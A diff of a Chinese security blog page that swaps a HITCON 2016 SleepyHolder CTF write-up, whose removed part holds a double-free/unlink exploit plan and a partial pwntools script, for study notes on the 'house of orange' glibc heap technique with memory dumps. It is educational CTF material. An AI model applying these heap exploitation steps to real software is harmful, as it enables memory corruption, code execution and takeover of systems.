@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="unlink,writeup,how2heap,堆利用,double_free," />
+  <meta name="keywords" content="堆利用,house_of_orange,IO_FILE,unsortedbin_attack," />
 
 
 
@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。">
-<meta name="keywords" content="unlink,writeup,how2heap,堆利用,double_free">
+<meta name="description" content="终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。  概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用 unsorted attack 修改 _IO_list_all 指针，并伪造 _IO_FILE_plus 结构体及其">
+<meta name="keywords" content="堆利用,house_of_orange,IO_FILE,unsortedbin_attack">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hitcon2016-SleepyHolder writeup">
-<meta property="og:url" content="https://hpasserby.me/post/e99b1303.html">
+<meta property="og:title" content="堆利用学习之house of orange">
+<meta property="og:url" content="https://hpasserby.me/post/f8f8701e.html">
 <meta property="og:site_name" content="Hpasserby">
-<meta property="og:description" content="题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。">
+<meta property="og:description" content="终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。  概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用 unsorted attack 修改 _IO_list_all 指针，并伪造 _IO_FILE_plus 结构体及其">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-10-10T08:49:30.065Z">
+<meta property="og:updated_time" content="2018-10-14T09:39:23.352Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hitcon2016-SleepyHolder writeup">
-<meta name="twitter:description" content="题目描述题目来源：HITCON CTF 2016知识点：unlink、double free这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。">
+<meta name="twitter:title" content="堆利用学习之house of orange">
+<meta name="twitter:description" content="终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。  概述house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用 unsorted attack 修改 _IO_list_all 指针，并伪造 _IO_FILE_plus 结构体及其">
 
 
 
@@ -122,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://hpasserby.me/post/e99b1303.html"/>
+  <link rel="canonical" href="https://hpasserby.me/post/f8f8701e.html"/>
 
 
 
 
 
-  <title>Hitcon2016-SleepyHolder writeup | Hpasserby</title>
+  <title>堆利用学习之house of orange | Hpasserby</title>
   
 
 
@@ -302,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://hpasserby.me/post/e99b1303.html">
+    <link itemprop="mainEntityOfPage" href="https://hpasserby.me/post/f8f8701e.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hpasserby">
@@ -319,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Hitcon2016-SleepyHolder writeup</h1>
+          <h1 class="post-title" itemprop="name headline">堆利用学习之house of orange</h1>
         
 
         <div class="post-meta">
@@ -331,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-05T22:53:11+08:00">
-                2018-10-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-14T11:16:17+08:00">
+                2018-10-14
               </time>
             
 
@@ -354,8 +354,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/writeups/" itemprop="url" rel="index">
-                    <span itemprop="name">writeups</span>
+                  <a href="/categories/堆利用学习/" itemprop="url" rel="index">
+                    <span itemprop="name">堆利用学习</span>
                   </a>
                 </span>
 
@@ -371,7 +371,7 @@
 
           
           
-             <span id="/post/e99b1303.html" class="leancloud_visitors" data-flag-title="Hitcon2016-SleepyHolder writeup">
+             <span id="/post/f8f8701e.html" class="leancloud_visitors" data-flag-title="堆利用学习之house of orange">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -402,35 +402,59 @@
       
 
       
-        <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2016<br>知识点：unlink、double free<br>这道题提供了3个功能，添加秘密、删除秘密、重写秘密。秘密分为3种：small、big、huge。其中huge秘密一旦写入再也不能改也不能删。题目中没有提供输出秘密的功能。<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Waking Sleepy Holder up ...</span><br><span class="line">Hey! Do you have any secret?</span><br><span class="line">I can help you to hold your secrets, and no one will be able to see it :)</span><br><span class="line">1.Keep secret</span><br><span class="line">2.Wipe secret</span><br><span class="line">3.Renew secret</span><br></pre></td></tr></table></figure></p>
-<p>程序保护如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/fastbinAtk/Hitcon2016_SleepyHolder/SleepyHolder&apos;</span><br><span class="line">     Arch:     amd64-64-little</span><br><span class="line">     RELRO:    Partial RELRO</span><br><span class="line">     Stack:    Canary found</span><br><span class="line">     NX:       NX enabled</span><br><span class="line">     PIE:      No PIE</span><br></pre></td></tr></table></figure></p>
-<h2 id="程序概况"><a href="#程序概况" class="headerlink" title="程序概况"></a>程序概况</h2><p><strong>keep函数：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What secret do you want to keep?</span><br><span class="line">1. Small secret</span><br><span class="line">2. Big secret</span><br><span class="line">3. Keep a huge secret and lock it forever</span><br></pre></td></tr></table></figure></p>
-<p>根据选择不同的secret申请不同大小的内存，分别是40、4000、400000个字节。其中每个大小的chunk只能申请一次。</p>
-<p><strong>wipe函数：</strong><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v0 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    dword_6020E0 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v0 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">free</span>(qword_6020C0);</span><br><span class="line">    dword_6020D8 = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>只能删除small和big两种secret。free之后没有清空指针，存在double free漏洞</p>
-<p><strong>renew函数：</strong><br>同样只能重写small和big两种secret，因为会检查是否使用的标记，所以不能UAF</p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h3><p>因为free之后没有清空指针，所以可以造成double free漏洞。这里double free可以用于辅助unlink。</p>
-<h4 id="修改inuse位"><a href="#修改inuse位" class="headerlink" title="修改inuse位"></a>修改inuse位</h4><ol>
-<li>依次<strong>分配small和big</strong>两个secret，然后<strong>释放掉small secret</strong>，small secret将进入fast bin。</li>
-<li>此时再<strong>申请large secret</strong>。由于这是一个large chunk，会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin，不能合并的就直接放到unsortedbin，这样的目的是减少堆中的碎片。所以<strong>small secret将会进入unsorted bin</strong>，于此同时，big secret的<strong>inuse位也将会被置0</strong>。</li>
-<li>再次<strong>释放small secret</strong>。因为之前释放的small secret已经不在fast bin中，所以此时不会被检测到double free。</li>
-<li>申请small secret。从fast bin中<strong>取回small secret</strong>。这样就达到了修改inuse位的目的</li>
-</ol>
-<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><blockquote>
-<p>前提知识：由于堆块的复用机制，当前一个chunk还在被使用时，后一个chunk的prevsize是归属于前一chunk，作为前一个chunk的数据区域。</p>
+        <blockquote>
+<p>终于学到了house of orange，看了无数师傅的博客，终于马马虎虎理清了一点思路，还是得写点笔记以免忘掉。</p>
 </blockquote>
-<p>程序中，small secret的大小为0x28，刚好可以利用到下一个chunk的prevsize。如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x6032e0:	0x0000000000000000	0x0000000000000031 &lt;== small secret</span><br><span class="line">0x6032f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x603300:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x603310:	**0x0a61616161616161**	0x0000000000000fb1 &lt;== big secret</span><br><span class="line">0x603320:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x603330:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x603340:	0x6262626262626262	0x000000000000000a</span><br></pre></td></tr></table></figure></p>
-<p>所以可以通过double free来改变big secret的inuse位，又可以控制big secret的prevsize，且堆指针是全局变量，可以成功实现unlink。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
-<li>按照前文方法修改inuse位</li>
-<li>在small secret构造一个fake chunk，并修改big chunk的prevsize</li>
-<li>释放big secret，触发unlink</li>
-<li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址</li>
-<li>算出system的地址，并将其写入free_got</li>
-<li>调用free，成功getshell</li>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>house of orange是来自Hitcon CTF 2016中的一道同名题目，其中使用了一种全新的攻击手段（现在也不新了2333），攻击的主要思路是利用 <em>unsorted attack</em> 修改 <em>_IO_list_all</em> 指针，并伪造 <em>_IO_FILE_plus</em> 结构体及其<em>vtable</em>（虚表）来劫持控制流。<br>直接上题目好了。。。<br><a id="more"></a></p>
+<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>程序菜单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></p>
+<p>程序保护全开_(:зゝ∠)_:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CANARY    : ENABLED</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br></pre></td></tr></table></figure></p>
+<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p><strong>build函数：</strong></p>
+<blockquote>
+<p>用户输入house的名字、orange的颜色和价格，并使用两个结构体保存。</p>
+</blockquote>
+<p>结构体：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> house           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> orange          dq ?</span><br><span class="line"><span class="number">00000008</span> name            dq ?</span><br><span class="line"><span class="number">00000010</span> house           ends</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> orange          struc ; (<span class="keyword">sizeof</span>=<span class="number">0x8</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> price           dd ?</span><br><span class="line"><span class="number">00000004</span> color           dd ?</span><br><span class="line"><span class="number">00000008</span> orange          ends</span><br></pre></td></tr></table></figure>
+<p>限制了只能build四次，每次build会申请3个chunk，其中只有第二个chunk（house name<br>）可以控制大小，且最大为0x1000<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">house = (house *)<span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">size = get_num();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    size = <span class="number">4096</span>;</span><br><span class="line">house-&gt;name = (__int64)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !house-&gt;name )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Malloc error !!!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Name :"</span>);</span><br><span class="line">get_str((<span class="keyword">void</span> *)house-&gt;name, size);</span><br><span class="line">orange = (orange *)<span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">8u</span>LL);</span><br></pre></td></tr></table></figure></p>
+<p><strong>upgrade函数：</strong></p>
+<blockquote>
+<p>修改house的name、orange的颜色和价格，只能修改最近build的house。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Length of name :"</span>);</span><br><span class="line">v2 = get_num();</span><br><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0x1000</span> )</span><br><span class="line">    v2 = <span class="number">4096</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Name:"</span>);</span><br><span class="line">get_str((<span class="keyword">void</span> *)qword_203068[<span class="number">1</span>], v2);</span><br></pre></td></tr></table></figure>
+<p>修改name的地方没有检查size的大小，所以存在<strong>堆溢出</strong></p>
+<p><strong>see函数</strong></p>
+<blockquote>
+<p>打印house的名字、orange的价格等，同样只能打印最近build的house。</p>
+</blockquote>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="泄露libc基址和堆地址"><a href="#泄露libc基址和堆地址" class="headerlink" title="泄露libc基址和堆地址"></a>泄露libc基址和堆地址</h2><p>发现程序中没有<code>free函数</code>，导致常规的堆利用方法都很难使用，这便是house of orange的核心之一——在没有free函数的情况下得到一个释放的堆块（unsorted bin），从而泄露数据。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>考虑这么一种情况，假设在malloc时，程序中的bins里都没有合适的chunk，同时<strong>top chunk的大小已经不够用来分配</strong>这块内存了。那么此时程序将会调用<code>sysmalloc</code>来向系统申请更多的空间，而我们的目的则是在<code>sysmalloc</code>中的<code>_int_free()</code>，以此来获得一块释放的堆块。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av); <span class="comment">//调用sysmalloc来分配内存</span></span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对于堆来说有两种拓展方式，一是通过改变brk来拓展堆，二是通过mmap的方式。其中只有<strong>brk拓展</strong>的方式才会调用到<code>_int_free()</code>将老的top chunk释放掉，所以还需要满足一些条件。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果所需分配的chunk大小大于mmap分配阈值，默认为128K，</span></span><br><span class="line"><span class="comment">// 并且当前进程使用mmap()分配的内存块小于设定的最大值</span></span><br><span class="line"><span class="comment">// 则将使用mmap()</span></span><br><span class="line"><span class="keyword">if</span> (av == <span class="literal">NULL</span> </span><br><span class="line">    || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (mp_.mmap_threshold)</span><br><span class="line">    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//使用mmap()</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>由上诉代码可知，要想使用brk拓展，需要满足<code>chunk size &lt; 0x‭20000‬</code><br>同时，在使用brk拓展之前，还会进行一系列check。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果top chunk没有初始化，则size为0</span></span><br><span class="line"><span class="comment">// top chunk的大小需要 &gt;= MINSIZE(有师傅的博客说在64位下是0x20)</span></span><br><span class="line"><span class="comment">// top chunk的inuse位需要是 1</span></span><br><span class="line"><span class="comment">// 检查是否对齐到内存页</span></span><br><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) </span><br><span class="line">        || ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE </span><br><span class="line">        &amp;&amp; prev_inuse (old_top)</span><br><span class="line">        &amp;&amp; ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure></p>
+<p>这里主要关注如何对齐到内存页。现代操作系统都是以内存页为单位进行内存管理的，一般内存页大小为4kb(0x1000)，那么top chunk的size加上top chunk的地址所得到的值是和0x1000对齐的。如：<code>0x602020+0x20fe0=0x623000</code>。</p>
+<p>整理以上代码，<strong>所需的条件有</strong>：</p>
+<blockquote>
+<ul>
+<li>分配的chunk大小小于0x‭20000，大于top chunk‬的size</li>
+<li>top chunk大小大于 MINSIZE（不能太小就行）</li>
+<li>top chunk的inuse为 1</li>
+<li>top chunk的大小要对齐到内存页</li>
+</ul>
+</blockquote>
+<p>满足了以上各种条件之后，就可以成功的调用<code>_int_free()</code>来释放top chunk<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* If possible, release the rest. */</span></span><br><span class="line"><span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line">    _int_free (av, old_top, <span class="number">1</span>);<span class="comment">//调用_int_free，free old_top。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>此后，原先的top chunk将被<strong>放入unsorted bin</strong>中。<br>下一次分配时，就将会<strong>从unsorted bin中切割</strong>合适的大小，而切割下来的chunk的fd和bk的值将会是<strong>libc中的地址</strong>了，同时，若该chunk是large chunk，在fd_nextsize和bk_nextsizez中还会储存<strong>堆中的地址</strong>。由此便可以<strong>完成泄露</strong>了。</p>
+<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ol>
+<li><p>先build一个house，通过upgrade从name溢出到top chunk，将top chunk的大小改为<code>0xfa1</code>（name chunk的大小为0x20）</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55e0ebd68000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> &lt;== house</span><br><span class="line"><span class="number">0x55e0ebd68010</span>:	<span class="number">0x000055e0ebd68050</span>	<span class="number">0x000055e0ebd68030</span></span><br><span class="line"><span class="number">0x55e0ebd68020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span> &lt;== name</span><br><span class="line"><span class="number">0x55e0ebd68030</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55e0ebd68040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000021</span> &lt;== orange</span><br><span class="line"><span class="number">0x55e0ebd68050</span>:	<span class="number">0x0000001f00000008</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55e0ebd68060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000fa1</span> &lt;== top chunk</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>申请一个大于top chunk的空间，触发brk来拓展top chunk。原top chunk将会被放入unsorted bin</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因为不是同一次运行，地址可能和前面不匹配</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x7f7ab34f37b8</span> (main_arena+<span class="number">88</span>) —▸ <span class="number">0x5598255700a0</span> ◂— <span class="number">0x7f7ab34f37b8</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>再申请一个大小合适的large chunk，该chunk将会从unsorted bin中切割下来。</p>
+ <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x559d1a1d40c0</span></span><br><span class="line"><span class="number">0x559d1a1d40c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000411</span></span><br><span class="line"><span class="number">0x559d1a1d40d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x00007f732b8fddc8</span> &lt;== libc</span><br><span class="line"><span class="number">0x559d1a1d40e0</span>:	<span class="number">0x0000559d1a1d40c0</span>	<span class="number">0x0000559d1a1d40c0</span> &lt;== heap</span><br><span class="line"><span class="number">0x559d1a1d40f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调用see()，输出name时，将会把libc的地址泄露出来。再调用upgrade()，把bk也全部填充为’a’，那么下一次see()就可以泄露出heap的地址。</p>
+</li>
 </ol>
-<h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">'./SleepyHolder'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./SleepyHolder'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'2. Big secret\n'</span>)</span><br><span class="line">	p.send(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'2. Big secret\n'</span>)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(<span class="string">'secret: \n'</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#分配chunk1 chunk2</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#释放chunk1</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span></span><br><span class="line">add(<span class="number">3</span>, <span class="string">'c'</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#这时再释放chunk1，让chunk1重新进入fast bin</span></span><br><span 